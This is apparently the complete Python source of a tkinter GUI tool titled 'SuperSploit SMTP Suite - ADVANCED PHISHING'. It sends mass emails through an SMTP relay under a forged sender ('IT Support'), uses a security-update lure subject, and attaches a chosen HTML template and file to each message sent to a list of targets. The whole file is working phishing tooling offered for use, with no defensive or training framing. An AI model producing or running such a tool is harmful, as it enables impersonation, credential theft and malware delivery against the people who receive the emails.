import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import threading
import time
import smtplib
import ssl
import os
import csv
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

class SMTPSpoofingGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SuperSploit SMTP Suite - ADVANCED PHISHING")
        self.root.geometry("800x850")
        
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.target_csv = tk.StringVar()
        self.attachment_path = tk.StringVar()
        self.template_path = tk.StringVar()
        
        self._build_ui()

    def _build_ui(self):
        main_frame = ttk.Frame(self.root, padding="15")
        main_frame.pack(fill=tk.BOTH, expand=True)

        # Relay Config
        relay_frame = ttk.LabelFrame(main_frame, text=" ⚙️ SMTP Relay Configuration ", padding="10")
        relay_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(relay_frame, text="Host:").grid(row=0, column=0, sticky=tk.W)
        self.host_entry = ttk.Entry(relay_frame, width=25)
        self.host_entry.insert(0, "smtp.mailgun.org")
        self.host_entry.grid(row=0, column=1, padx=5)
        
        ttk.Label(relay_frame, text="Port:").grid(row=0, column=2, sticky=tk.W)
        self.port_entry = ttk.Entry(relay_frame, width=10)
        self.port_entry.insert(0, "587")
        self.port_entry.grid(row=0, column=3, padx=5)
        
        ttk.Label(relay_frame, text="User:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.user_entry = ttk.Entry(relay_frame, width=25)
        self.user_entry.grid(row=1, column=1, padx=5)
        
        ttk.Label(relay_frame, text="Pass:").grid(row=1, column=2, sticky=tk.W)
        self.pass_entry = ttk.Entry(relay_frame, width=25, show="*")
        self.pass_entry.grid(row=1, column=3, padx=5)

        # Spoofing Details
        spoof_frame = ttk.LabelFrame(main_frame, text=" 🎭 Spoofing Details ", padding="10")
        spoof_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(spoof_frame, text="From Name:").grid(row=0, column=0, sticky=tk.W)
        self.from_name = ttk.Entry(spoof_frame, width=25)
        self.from_name.insert(0, "IT Support")
        self.from_name.grid(row=0, column=1, padx=5, pady=2)
        
        ttk.Label(spoof_frame, text="From Email:").grid(row=0, column=2, sticky=tk.W)
        self.from_email = ttk.Entry(spoof_frame, width=25)
        self.from_email.insert(0, "support@company.com")
        self.from_email.grid(row=0, column=3, padx=5)
        
        ttk.Label(spoof_frame, text="Subject:").grid(row=1, column=0, sticky=tk.W)
        self.subject_entry = ttk.Entry(spoof_frame, width=60)
        self.subject_entry.insert(0, "Important Security Update")
        self.subject_entry.grid(row=1, column=1, columnspan=3, padx=5, pady=5)

        # Payload & Targets
        payload_frame = ttk.LabelFrame(main_frame, text=" 📦 Payload & Targets ", padding="10")
        payload_frame.pack(fill=tk.X, pady=5)

        ttk.Button(payload_frame, text="📂 Load Target CSV", command=lambda: self._load_file(self.target_csv, "CSV", "*.csv")).grid(row=0, column=0, padx=5, pady=2)
        ttk.Entry(payload_frame, textvariable=self.target_csv, width=45, state="readonly").grid(row=0, column=1, columnspan=2)
        
        ttk.Label(payload_frame, text="Single Target:").grid(row=1, column=0, sticky=tk.E, padx=5)
        self.single_target = ttk.Entry(payload_frame, width=45)
        self.single_target.grid(row=1, column=1, columnspan=2, pady=2)

        ttk.Button(payload_frame, text="📄 Load HTML Template", command=lambda: self._load_file(self.template_path, "HTML", "*.html")).grid(row=2, column=0, padx=5, pady=2)
        ttk.Entry(payload_frame, textvariable=self.template_path, width=45, state="readonly").grid(row=2, column=1, columnspan=2)

        ttk.Button(payload_frame, text="📎 Load Attachment", command=lambda: self._load_file(self.attachment_path, "All", "*.*")).grid(row=3, column=0, padx=5, pady=2)
        ttk.Entry(payload_frame, textvariable=self.attachment_path, width=45, state="readonly").grid(row=3, column=1, columnspan=2)

        # Action & Console
        btn_frame = ttk.Frame(main_frame)
        btn_frame.pack(fill=tk.X, pady=5)
        self.send_btn = ttk.Button(btn_frame, text="🚀 INITIATE MASS BLAST", command=self._start_delivery)
        self.send_btn.pack(side=tk.RIGHT)

        log_frame = ttk.LabelFrame(main_frame, text=" 🖥️ Delivery Console ", padding="5")
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        self.console = scrolledtext.ScrolledText(log_frame, bg="black", fg="#00FF00", font=("Courier", 9))
        self.console.pack(fill=tk.BOTH, expand=True)

    def _load_file(self, var, ftype_name, ftype_ext):
        f = filedialog.askopenfilename(filetypes=[(f"{ftype_name} Files", ftype_ext)])
        if f: var.set(f)

    def log(self, msg):
        self.console.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
        self.console.see(tk.END)

    def _start_delivery(self):
        self.send_btn.config(state=tk.DISABLED)
        threading.Thread(target=self._delivery_logic, daemon=True).start()

    def _delivery_logic(self):
        targets = []
        if self.target_csv.get():
            try:
                with open(self.target_csv.get(), 'r') as f:
                    targets = [row[0] for row in csv.reader(f) if row]
            except Exception as e: self.log(f"[-] CSV Error: {e}")
        elif self.single_target.get():
            targets = [self.single_target.get().strip()]

        if not targets:
            self.log("[-] ERROR: No targets loaded.")
            self.send_btn.config(state=tk.NORMAL)
            return

        self.log(f"[*] Compiling payload for {len(targets)} targets...")
        
        html_content = "Please see the attached document."
        if self.template_path.get() and os.path.exists(self.template_path.get()):
            with open(self.template_path.get(), 'r') as f:
                html_content = f.read()

        try:
            port = int(self.port_entry.get())
            self.log(f"[*] Connecting to {self.host_entry.get()}:{port}...")
            if port == 465:
                server = smtplib.SMTP_SSL(self.host_entry.get(), port, context=ssl.create_default_context())
            else:
                server = smtplib.SMTP(self.host_entry.get(), port)
                try: server.starttls(context=ssl.create_default_context())
                except: pass
            
            if self.user_entry.get() and self.pass_entry.get():
                server.login(self.user_entry.get(), self.pass_entry.get())
                self.log("[+] Authentication successful.")

            for t in targets:
                msg = MIMEMultipart()
                msg['From'] = f"{self.from_name.get()} <{self.from_email.get()}>"
                msg['To'] = t
                msg['Subject'] = self.subject_entry.get()
                msg['Reply-To'] = self.from_email.get()
                msg.attach(MIMEText(html_content, 'html'))

                if self.attachment_path.get() and os.path.exists(self.attachment_path.get()):
                    with open(self.attachment_path.get(), "rb") as a:
                        part = MIMEBase("application", "octet-stream")
                        part.set_payload(a.read())
                    encoders.encode_base64(part)
                    part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(self.attachment_path.get())}")
                    msg.attach(part)

                server.send_message(msg)
                self.log(f"[+] Dispatched to: {t}")
                if len(targets) > 1: time.sleep(1)

            server.quit()
            self.log("[+] Campaign Complete.")
        except Exception as e:
            self.log(f"[-] Fatal SMTP Error: {e}")
            
        self.send_btn.config(state=tk.NORMAL)

if __name__ == "__main__":
    root = tk.Tk()
    app = SMTPSpoofingGUI(root)
    root.mainloop()